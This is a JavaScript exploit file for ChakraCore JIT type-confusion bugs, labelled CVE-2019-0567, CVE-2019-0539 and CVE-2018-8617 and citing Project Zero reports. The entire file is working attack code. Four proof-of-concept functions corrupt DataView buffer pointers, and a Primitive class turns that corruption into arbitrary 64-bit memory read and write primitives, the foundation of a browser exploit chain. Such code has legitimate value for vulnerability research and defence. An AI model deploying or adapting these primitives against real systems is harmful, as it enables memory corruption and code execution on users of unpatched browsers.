function createAuxSlotsObj() {
    let o = {}
    o.a = 1;
    o.b = 2;
    o.c = 3;
    o.d = 4;
    o.e = 5;
    o.f = 6;
    o.g = 7;
    o.h = 8;
    o.i = 9;
    o.j = 10;

    return o;
}

const TypeConfusionPoCs = {
    // ref: https://bugs.chromium.org/p/project-zero/issues/detail?id=1702
    CVE_2019_0567_InitProto: (dataview1, dataview2) => {
        function opt(o, proto, value) {
            o.b = 1;
            let tmp = { __proto__: proto };
            o.a = value;
        }

        let auxSlotsObj = createAuxSlotsObj();

        for (let i = 0; i < 2000; i++) {
            let o = { a: 1, b: 2 };
            opt(o, {}, {});
        }

        let inlineObj = { a: 1, b: 2 };
        opt(inlineObj, inlineObj, auxSlotsObj);

        // auxSlotsObj->auxSlots (inlineObj->auxSlots+0x10) = dataview1
        inlineObj.c = dataview1;

        // dataview1->buffer (auxSlotsObj->auxSlots+0x38) = dataview2
        auxSlotsObj.h = dataview2;
    },
    // ref: https://bugs.chromium.org/p/project-zero/issues/detail?id=1702
    CVE_2019_0567_NewScObjectNoCtor: (dataview1, dataview2) => {
        function cons() {

        }

        function opt(o, value) {
            o.b = 1;
            new cons();
            o.a = value;
        }

        let auxSlotsObj = createAuxSlotsObj();

        for (let i = 0; i < 2000; i++) {
            cons.prototype = {};
            let o = { a: 1, b: 2, c: 3 };
            opt(o, {});
        }

        let inlineObj = { a: 1, b: 2, c: 3 };
        cons.prototype = inlineObj;
        opt(inlineObj, auxSlotsObj);

        // auxSlotsObj->auxSlots (inlineObj->auxSlots+0x10) = dataview1
        inlineObj.d = dataview1;

        // dataview1->buffer (auxSlotsObj->auxSlots+0x38) = dataview2
        auxSlotsObj.h = dataview2;
    },
    // ref: https://bugs.chromium.org/p/project-zero/issues/detail?id=1703
    CVE_2019_0539: (dataview1, dataview2) => {
        function opt(o, c, value) {
            o.b = 1;

            class A extends c {

            }

            o.a = value;
        }

        let auxSlotsObj = createAuxSlotsObj();

        for (let i = 0; i < 2000; i++) {
            let o = { a: 1, b: 2 };
            opt(o, (function () { }), {});
        }

        let inlineObj = { a: 1, b: 2 };
        let cons = function () { };

        cons.prototype = inlineObj;

        opt(inlineObj, cons, auxSlotsObj);

        // auxSlotsObj->auxSlots (inlineObj->auxSlots+0x10) = dataview1
        inlineObj.c = dataview1;

        // dataview1->buffer (auxSlotsObj->auxSlots+0x38) = dataview2
        auxSlotsObj.h = dataview2;
    },
    // ref: https://bugs.chromium.org/p/project-zero/issues/detail?id=1705
    CVE_2018_8617: (dataview1, dataview2) => {
        let auxSlotsObj = createAuxSlotsObj();

        function opt(a, b) {
            a.b = 2;
            b.push(0);
            a.a = auxSlotsObj;
        }

        Object.prototype.push = Array.prototype.push;

        for (let i = 0; i < 1000; i++) {
            let a = { a: 1, b: 2, c: 3 };
            opt(a, {});
        }

        let inlineObj = { a: 1, b: 2, c: 3 };
        opt(inlineObj, inlineObj);

        // auxSlotsObj->auxSlots (inlineObj->auxSlots+0x10) = dataview1
        inlineObj.d = dataview1;

        // dataview1->buffer (auxSlotsObj->auxSlots+0x38) = dataview2
        auxSlotsObj.h = dataview2;
    }
}

class Primitive {
    constructor(TypeConfusionPoC) {
        this.dataview1 = new DataView(new ArrayBuffer(0x100));
        this.dataview2 = new DataView(new ArrayBuffer(0x100));

        TypeConfusionPoC(this.dataview1, this.dataview2);

        this.vtable = {
            lo: this.dataview1.getUint32(0x0, true),
            hi: this.dataview1.getUint32(0x4, true)
        }

        this.type = {
            lo: this.dataview1.getUint32(0x8, true),
            hi: this.dataview1.getUint32(0xC, true)
        }
    }

    _overwriteBufferPtr(address) {
        // dataview2->buffer (dataview1+0x38) = address
        this.dataview1.setUint32(0x38, address.lo, true);
        this.dataview1.setUint32(0x3C, address.hi, true);
    }

    read64(address) {
        this._overwriteBufferPtr(address);
        return {
            lo: this.dataview2.getUint32(0x0, true),
            hi: this.dataview2.getUint32(0x4, true)
        };
    }

    write64(address, value) {
        this._overwriteBufferPtr(address);
        this.dataview2.setUint32(0x0, value.lo, true);
        this.dataview2.setUint32(0x4, value.hi, true);
    }

    writeValues(address, values) {
        for (let i = 0; i < values.length; i += 2) {
            this.write64(
                { lo: address.lo + i * 4, hi: address.hi },
                { lo: values[i], hi: values[i + 1] }
            );
        }
    }
}
